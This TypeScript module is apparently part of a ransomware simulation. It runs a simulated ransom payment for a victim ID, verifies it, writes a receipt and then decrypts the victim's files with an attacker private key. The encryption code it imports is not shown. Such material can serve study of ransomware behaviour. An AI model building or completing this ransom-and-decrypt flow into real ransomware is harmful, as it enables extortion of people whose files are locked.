import { createInterface } from 'readline';
import {
    decryptFiles,
    simulatePayment,
    verifyPayment,
    createPaymentReceipt
} from './ransomware';

// Create a promise-based readline question function
function question(rl: ReturnType<typeof createInterface>, query: string): Promise<string> {
    return new Promise((resolve) => {
        rl.question(query, (answer) => {
            resolve(answer);
        });
    });
}

// Function to run the payment and decryption process
export async function runPaymentAndDecryption(
    rl: ReturnType<typeof createInterface>,
    victimId: string,
    encryptedAESKey: Buffer,
    attackerPrivateKey: string,
    targetDir: string
): Promise<boolean> {
    console.log('\n=== PAYMENT SIMULATION ===');
    
    try {
        // Simulate payment
        const payment = await simulatePayment(victimId);
        console.log(`Payment simulation: Transaction ID ${payment.transactionId}`);
        
        // Verify payment
        const verified = await verifyPayment(payment.transactionId, victimId);
        console.log(`Payment verification: ${verified ? 'Successful' : 'Failed'}`);
        
        if (verified) {
            // Create payment receipt
            await createPaymentReceipt(
                victimId,
                payment.transactionId,
                targetDir
            );
            console.log('Payment receipt created in the target directory.');
            
            // Ask if user wants to decrypt now
            const decAnswer = await question(rl, '\nWould you like to decrypt files now? (y/n): ');
            
            if (decAnswer.toLowerCase() === 'y') {
                console.log('\nDecrypting files...');
                
                try {
                    // Decrypt files
                    const decryptedFiles = await decryptFiles(
                        targetDir,
                        encryptedAESKey,
                        attackerPrivateKey
                    );
                    
                    console.log(`\nDecryption complete! ${decryptedFiles.length} files restored.`);
                    return true;
                } catch (decryptError) {
                    console.error(`\nError during decryption: ${decryptError}`);
                    return false;
                }
            }
        } else {
            console.log('\nPayment verification failed. Files remain encrypted.');
            return false;
        }
    } catch (error) {
        console.error(`\nError during payment process: ${error}`);
        return false;
    }
    
    return false;
}
